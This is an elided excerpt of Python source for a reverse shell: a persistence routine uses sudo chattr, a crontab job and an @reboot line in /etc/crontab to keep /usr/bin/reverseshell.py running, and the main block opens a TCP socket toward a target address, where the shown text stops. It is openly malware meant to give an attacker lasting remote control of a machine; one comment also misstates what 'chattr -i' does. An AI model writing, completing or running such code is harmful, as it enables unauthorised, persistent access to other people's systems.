...
class Shell:
    ...
    def persistence():
        ...
        run(
            f'sudo chattr -i /usr/bin/reverseshell.py',
            shell=True
        )  # make the script unmodifiable in /usr/bin
        run(
            f'echo "30 18 * * * /usr/bin/reverseshell.py" | crontab -e',
            shell=True
        )  # add a cronjob for this file
        run(
            f'echo "@reboot /usr/bin/reverseshell.py" | tee -a /etc/crontab',
            shell=True
        )  # add reverseshell.py to startup
        time.sleep(0.25)
...
if __name__ == "__main__":
    os.system('clear')
    Shell.persistence()  # call the persistence function
    from os import dup2
    import socket
    ...
    socket_sock = socket.socket(
        socket.AF_INET,
        socket.SOCK_STREAM
    )  # use ipv4(AF_INET) and tcp(SOCK_STREAM) for the connection
    socket_sock.connect((
        reverse_connection.target_address,
